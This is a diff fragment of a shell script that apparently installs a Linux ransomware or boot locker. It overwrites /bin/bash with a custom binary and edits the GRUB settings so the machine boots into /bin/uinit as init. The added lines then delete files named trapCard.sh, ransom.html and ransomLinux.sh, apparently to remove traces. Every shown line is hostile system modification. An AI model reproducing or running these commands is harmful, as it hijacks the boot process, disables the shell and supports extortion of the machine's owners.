@@ -22,3 +22,7 @@ cp /bin/uinit /bin/bash
 sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub
 sed -i '/.*GRUB_CMDLINE_LINUX=.*/c\GRUB_CMDLINE_LINUX_="init=/bin/uinit"' /etc/default/grub
 sed -i '/.*GRUB_CMDLINE_LINUX_DEFAULT.*/c\#GRUB_CMDLINE_LINUX_DEFAULT=""' /etc/default/grub.d/50-curtin-settings.cfg
+
+rm trapCard.sh
+rm ransom.html
+rm ransomLinux.sh
